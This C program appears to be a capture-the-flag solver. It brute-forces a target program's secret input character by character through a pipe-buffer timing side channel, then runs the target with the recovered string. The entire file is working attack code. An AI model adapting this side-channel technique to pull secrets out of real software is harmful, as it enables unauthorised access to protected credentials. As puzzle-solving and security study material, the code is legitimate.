#include <poll.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define TIMEOUT     10
#define MAXINPUT    1024
#define PIPEMAX     (1<<16)
#define MSGLEN      33 // Welcome...\n
#define TAUNTLEN    35 // Haha...\n
#define CHAR_START  1
#define CHAR_END    128

char        filling[PIPEMAX], buf[PIPEMAX];
const char  *prog, *file;
int         oldout, p_err[2], p_out[2];
struct      pollfd poll_out;

int test_string(int size, char* input) {
    // fill buffer until just enough space for dots of string,
    // stalling to see if haha will be printed
    write(p_err[1], filling, PIPEMAX - (MSGLEN+size-1));

    pid_t pid;
    if (!(pid = fork())) {
        execl(prog, prog, file, input, NULL);
    }

    poll(&poll_out, 1, TIMEOUT);         // wait a bit for possible haha

    read(p_err[0], buf, PIPEMAX-size+1); // flush fill + welcome
    wait(pid);                           // wait for \n
    read(p_err[0], buf, size+1);         // flush dots
    read(p_out[0], buf, TAUNTLEN);       // flush taunt
    return !(poll_out.revents & POLLIN);
}

int main(int argc, char ** argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s PROG FILE\n", argv[0]);
        exit(-1);
    }

    prog = argv[1]; file = argv[2];

    oldout = dup(STDOUT_FILENO);
    pipe(p_out); dup2(p_out[1], STDOUT_FILENO);
    pipe(p_err); dup2(p_err[1], STDERR_FILENO);
    poll_out.fd = p_out[0];
    poll_out.events = POLLIN;

    memset(filling, 'a', PIPEMAX);

    char input[MAXINPUT] = {0};
    int size;
    unsigned char c;
    for (size = 2; c < CHAR_END && size < MAXINPUT; size++) {
        // fill in extra char to make sure we'll fail
        input[size - 1] = -1;
        for (c = CHAR_START; c < CHAR_END; c++) {
            input[size - 2] = c;
            if (test_string(size, input)) {
                break;
            }
        }
    }

    // make it print the pwd to stdout
    input[size-3] = '\0';
    dup2(oldout, STDERR_FILENO);
    execl(prog, prog, file, input, NULL);
}
